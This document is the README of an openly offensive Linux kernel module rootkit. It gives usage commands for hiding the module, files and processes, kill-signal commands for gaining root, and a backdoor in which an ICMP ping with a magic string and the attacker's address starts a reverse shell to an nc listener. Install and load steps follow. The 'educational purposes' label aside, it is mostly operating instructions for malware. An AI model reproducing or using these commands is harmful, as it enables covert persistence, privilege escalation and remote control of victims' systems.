# Linux Kernel Module Rootkit

For educational purposes only.

Tested on ubuntu 22.04.1 LTS.

This simple kernel module rootkit overwrites linux system calls to hide itself, hide files and directories and hide multiple processes. Also when loaded it secretly starts an ICMP listener that starts a reverse shell in response to an attackers ping. It can be controlled via `kill` commands: 

## Commands

- Hide/Show rootkit in the list of loaded modules (`$ lsmod`)
  
  ```sh
  $ kill -63 1
  ```
  
  When installed it starts hidden. You can only remove it when it's unhidden.

- Become root
  
  ```sh
  $ kill -64 1
  ```

- Hide process with pid

  ```sh
  $ kill -62 <pid>
  ```

- Unhide process with pid

  ```sh
  $ kill -61 <pid>
  ```

It also hides every file and directory with prefix `rootk_`.

## Backdoor

On attacker machine start netcat listener on some port:

```sh
$ nc -lnvp <port>
```

Send ICMP ping to victim:

```sh
$ nping --icmp -c 1 -dest-ip <victim-ip> --data-string 'xCs!w@ <attacker-ip> <port>'
```

## Install

Compile module and backdoor:

```sh
$ make
$ make install
```

Load module:

```sh
$ sudo insmod build/rootkit.ko
```

### Remove module:

Make sure the module is visible in `lsmod`. To toggle visibility run `kill -63 1`.

Then you can remove it using:

```sh
$ sudo rmmod rootkit.ko
```
